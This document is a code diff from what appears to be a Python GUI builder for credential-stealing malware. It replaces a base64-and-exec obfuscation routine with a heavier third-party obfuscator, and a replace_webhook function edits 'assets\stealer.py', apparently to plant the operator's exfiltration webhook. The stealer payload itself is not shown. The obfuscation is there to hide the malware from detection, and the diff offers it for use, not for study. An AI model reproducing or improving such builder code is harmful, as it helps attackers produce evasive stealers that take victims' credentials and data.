@@ -4,7 +4,7 @@ import customtkinter as ctk
 from tkinter import messagebox, filedialog
 import base64
 import re
-import python_obfuscator
+from BlankOBFv2 import *
 
 ctk.set_appearance_mode("dark")
 app = ctk.CTk()
@@ -29,17 +29,8 @@ def extract_imports_from_code(pycode):
     return '\n'.join([line for line in pycode.splitlines() if import_pattern.match(line)])
 
 def obfuscate_code(code):
-    obfuscator = python_obfuscator.obfuscator()
-    c = extract_imports_from_code(code)
-    encoded_code = list(base64.b64encode(code.encode('utf-8')))
-    obfuscated_code = f"""
-import base64
-
-{c}
-
-exec(base64.b64decode(bytes({encoded_code})))
-"""
-    return c + "\nimport base64\n" + obfuscator.obfuscate(obfuscated_code)
+    obfuscator = BlankOBFv2(code=code, include_imports=True, recursion=3)
+    return obfuscator.obfuscate()
 
 def replace_webhook(webhook):
     file_path = r'assets\stealer.py'
